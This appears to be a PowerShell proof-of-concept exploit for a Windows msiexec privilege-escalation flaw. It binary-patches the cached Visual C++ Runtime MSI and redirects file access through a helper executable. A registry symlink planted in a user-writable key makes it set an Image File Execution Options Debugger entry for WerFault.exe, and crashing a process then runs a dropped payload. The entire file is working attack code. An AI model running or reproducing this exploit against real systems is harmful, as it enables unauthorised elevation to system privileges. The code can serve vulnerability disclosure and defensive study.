Import-Module "$PSScriptRoot\NtApiDotNet.dll" -ErrorAction Stop

$ExploitExe = "$PSScriptRoot\exploit.exe"
$PayloadExe = "$PSScriptRoot\payload.exe"
$req_files = (Test-Path $ExploitExe) -and (Test-Path $PayloadExe)
if(-not $req_files) {
    Write-Error "Required files not found in script directory."
}

function New-ProcessWithDiagnostics($exe, $arguments) {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $exe
    $psi.Arguments = $arguments
    $psi.UseShellExecute = $false
    $psi.RedirectStandardInput = $true
    return [System.Diagnostics.Process]::Start($psi)
}

# MsiExec EoP exploit
# Invoke msiexec with a fake LocalPackage where registry keys have been replaced.
# Because the CreateFile operations on the MSI file impersonate the calling user,
# a modified device map allow redirecting these calls to another MSI file.
function Invoke-MisExecExploit($MsiPath, $StringReplaces, $CheckPath) {
    $Result = $False
    Write-Host "Patching MSI file..."
    New-Item -Type Directory -Force C:\Temp\ -ErrorAction Stop | Out-Null

    $MsiFilename = Split-Path -Leaf $MsiPath
    $PatchedMsiPath = Join-Path C:\Temp $MsiFilename

    $MsiBytes = [System.IO.File]::ReadAllBytes($MsiPath)
    $MsiBytesConv = [System.BitConverter]::ToString($MsiBytes)
    $StringReplaces | % {
        $Pattern, $Replace = [System.Text.Encoding]::ASCII.GetBytes($_[0]), [System.Text.Encoding]::ASCII.GetBytes($_[1])
        # pad with null bytes if needed
        if($Replace.length -lt $Pattern.length) {
            $Replace += New-Object byte[] ($Pattern.length - $Replace.length)
        }
        $MsiBytesConv = $MsiBytesConv -Replace ([System.BitConverter]::ToString($Pattern)),([System.BitConverter]::ToString($Replace))
    }
    $MsiBytes = [byte[]] (($MsiBytesConv -replace '-') -replace '..', '0x$&,' -split ',' -ne '')
    [System.IO.File]::WriteAllBytes($PatchedMsiPath, $MsiBytes) | Out-Null

    Write-Host "Starting redirection executable..."
    $exe = New-ProcessWithDiagnostics -exe $ExploitExe -arguments $MsiFilename
    Sleep -Seconds 2
    $exe.StandardInput.WriteLine("")

    Write-Host "Waiting for the registry key..."
    While((-not (Test-Path $CheckPath)) -and ((Get-Service -Name "msiserver").Status -notmatch "Stopped") ) {
        Start-Sleep -Milliseconds 500
    }

    if(Test-Path $CheckPath) {
        $Result = $True
        Write-Host -ForegroundColor Green "Registry key created!"
    } else {
        Write-Warning "Registry key was not created. Check C:\Temp\msiexec.log"
    }

    Write-Host "Stopping redirection..."
    $exe.StandardInput.WriteLine("")

    return $Result
}

# PoC for VC Minimum Runtime packages
#   Registry key created:
#     HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WerFault.exe
#     with value: Debugger="C:\x\z.exe"
function Invoke-MsiExecExploitForVCRuntime() {
    $CheckPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WerFault.exe"
    if(Test-Path $CheckPath) {
        throw "Target registry key ($CheckPath) already exists! Delete it to try again."
    }

    $Product = Get-WmiObject -Class Win32_Product | ?{$_.Name -match "Microsoft Visual C\+\+ 2019 X64 Minimum Runtime"}
    if($Product -eq $null) {
        Write-Error "VC++ Runtime x64 package not found"
    }

    $MsiPath = $Product.LocalPackage.ToString()
    $Version = $Product.Version.ToString()

    # because the registry key to create is larger than the replaced registry key in the MSI file
    # we use an intermediate key in HKLM and a registry key symlink to redirect to our target key
    # replaced:   SOFTWARE\Microsoft\DevDiv\VC\Servicing\14.0\RuntimeMinimum
    # replace by: SOFTWARE\Microsoft\Tracing\a\abcdefghijklmnop\WerFault.exe
    # reg symlink:
    # HKLM\SOFTWARE\Microsoft\Tracing\a\abcdefghijklmnop -> 
    #   HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
    # Note that the registry symlink has nothing to do with the vulnerability itself, this is 
    # only to simply "binary patch" the MSI file directly for this PoC, and is not required for 
    # exploitation.
    Write-Host "Creating registry key symlink..."
    # HKLM\SOFTWARE\Microsoft\Tracing is user-writable
    New-Item -Path HKLM:\SOFTWARE\Microsoft\Tracing -Name a -Force | Out-Null
    # ajust permissions to allow creating subkeys
    $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Tracing\a", [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions)
    $RegACL = $RegKey.GetAccessControl()
    $RegRule = New-Object System.Security.AccessControl.RegistryAccessRule(".\USERS", "FullControl", @("ObjectInherit", "ContainerInherit"), "None", "Allow")
    $RegACL.SetAccessRule($RegRule)
    $RegKey.SetAccessControl($RegACL)
    # symlink to target key's parent
    $RegSymlink = [NtApiDotNet.NtKey]::CreateSymbolicLink("\Registry\Machine\SOFTWARE\Microsoft\Tracing\a\abcdefghijklmnop", $null, "\REGISTRY\Machine\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options")

    # Exploit will replace these strings in the MSI package
    $KeyPattern = "SOFTWARE\Microsoft\DevDiv\VC\Servicing\14.0\RuntimeMinimum"
    $KeyReplace = "SOFTWARE\Microsoft\Tracing\a\abcdefghijklmnop\WerFault.exe"
    $NamePattern = "UpdateVersion"
    $NameReplace = "Debugger"
    $ValuePattern = "ProductVersion" + $Version # 11 chars, e.g. ProductVersion14.26.28720
    $ValueReplace = "ProductVersionC:\x\z.exe"

    $StringReplaces = @(
        ($KeyPattern, $KeyReplace),
        ($NamePattern, $NameReplace),
        ($ValuePattern, $ValueReplace)
    )

    $Result = Invoke-MisExecExploit -MsiPath $MsiPath -StringReplaces $StringReplaces -CheckPath $CheckPath
    
    if($Result -eq $True) {
        Write-Host "Running payload..."
        New-Item -Type Directory -Force C:\x | Out-Null
        Copy-Item -Force $PayloadExe C:\x\z.exe
        Start-Process -NoNewWindow powershell.exe "-Command `"[Environment]::FailFast('Error')`""
    }

    Write-Host "Removing temporary registry symlink..."
    $RegSymlink.Delete()
    Remove-Item -Path HKLM:\SOFTWARE\Microsoft\Tracing\a
}

